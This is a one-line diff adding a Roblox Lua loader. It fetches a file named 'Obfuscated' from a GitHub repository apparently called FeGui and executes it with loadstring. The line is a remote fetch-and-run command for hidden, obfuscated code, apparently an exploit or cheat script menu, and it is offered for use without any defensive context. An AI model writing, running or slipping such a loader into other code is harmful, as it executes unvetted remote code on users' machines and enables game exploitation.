@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/loboazul666/FeGui/main/Obfuscated", true))()
